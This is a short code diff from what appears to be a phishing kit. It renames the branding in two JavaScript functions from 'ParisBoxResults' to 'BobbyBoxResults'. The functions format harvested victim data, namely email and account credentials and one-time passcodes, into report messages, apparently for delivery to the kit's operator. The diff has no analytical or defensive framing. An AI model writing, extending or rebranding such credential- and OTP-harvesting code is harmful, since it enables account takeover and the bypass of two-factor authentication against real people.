@@ -99,7 +99,7 @@ const composeCredentialsMessage = (data) => {
     }) + ' UTC';
 
     return `
-*🔐 ParisBoxResults - Credentials 🔐*
+*🔐 BobbyBoxResults - Credentials 🔐*
 
 *ACCOUNT DETAILS*
 - 📧 Email: ${safeEmail}
@@ -142,7 +142,7 @@ const composeOtpMessage = (data) => {
     }) + ' UTC';
 
     return `
-*🔑 ParisBoxResults - OTP Code 🔑*
+*🔑 BobbyBoxResults - OTP Code 🔑*
 
 *VERIFICATION CODE*
 - 🔢 OTP Code: ${safeOtp}
